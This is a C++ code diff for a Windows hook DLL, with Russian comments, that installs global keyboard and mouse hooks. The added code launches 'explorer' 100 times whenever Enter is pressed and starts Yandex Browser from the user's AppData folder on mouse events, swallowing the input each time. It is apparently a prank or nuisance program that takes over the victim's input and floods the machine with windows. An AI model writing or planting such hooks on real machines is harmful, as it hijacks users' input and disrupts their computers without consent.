@@ -5,6 +5,7 @@
 #include <string>
 #include <locale>
 #include <codecvt>
+#include <iostream>
 
 HHOOK hMouseHook;
 HHOOK hKeyboardHook;
@@ -40,35 +41,51 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 	}
 	if (wParam == WM_KEYDOWN) {
 		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
+
+		if (p->vkCode == VK_RETURN)
+		{
+			int n = 0;
+			SetMouseHook();
+			while (n < 100)			
+			{				
+				system("explorer");
+				n++;
+			}
+			return 0;
+		}
+
+		/*PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
 		LPPOINT  pt = new POINT;
 		GetCursorPos(pt);
 		int x = pt->x;
 		int y = pt->y;
+
+
 		//switch (wParam) {
 		switch (p->vkCode) {
 		case VK_LEFT:
-			/* Обрабатывает клавишу LEFT ARROW (Стрелка влево). */
+			// Обрабатывает клавишу LEFT ARROW (Стрелка влево).
 			SetCursorPos(x - 10, y);
 			break;
 
 		case VK_RIGHT:
-			/* Обрабатывает клавишу RIGHT ARROW (Стрелка вправо). */
+			// Обрабатывает клавишу RIGHT ARROW (Стрелка вправо).
 			SetCursorPos(x + 10, y);
 			break;
 
 		case VK_UP:
-			/* Обрабатывает клавишу UP ARROW (Стрелка вверх). */
+			// Обрабатывает клавишу UP ARROW (Стрелка вверх).
 			SetCursorPos(x, y - 10);
 			break;
 
 		case VK_DOWN:
-			/* Обрабатывает клавишу DOWN ARROW (Стрелка вниз). */
+			// Обрабатывает клавишу DOWN ARROW (Стрелка вниз).
 
 			SetCursorPos(x, y + 10);
 			break;
 		default:
 			break;
-		}
+		}*/
 
 		return CallNextHookEx(NULL, code, wParam, lParam);
 	}
@@ -100,11 +117,12 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 		}
 		if (p->pt.x > 1200) {
 			SetCursorPos(1200, p->pt.y);
-		}*/		
+		}*/
+
 		wchar_t buffer[256]; // буфер
 		DWORD size; // размер
 		size = sizeof(buffer); // размер буфера
-		GetUserName(buffer, &size);
+		GetUserNameW(buffer, &size);
 		std::wstring ws = buffer;
 
 		using convert_typeX = std::codecvt_utf8<wchar_t>;
@@ -113,18 +131,10 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 		std::string st = "C:/Users/" + userName + "/AppData/Local/Yandex/YandexBrowser/Application/browser.exe";
 		const char* str = st.c_str();
-		system(str);		
+		system(str);
 		return 0;
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
-}
-
-std::string ws2s(std::wstring& wstr)
-{
-	using convert_typeX = std::codecvt_utf8<wchar_t>;
-	std::wstring_convert<convert_typeX, wchar_t> converterX;
-
-	return converterX.to_bytes(wstr);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
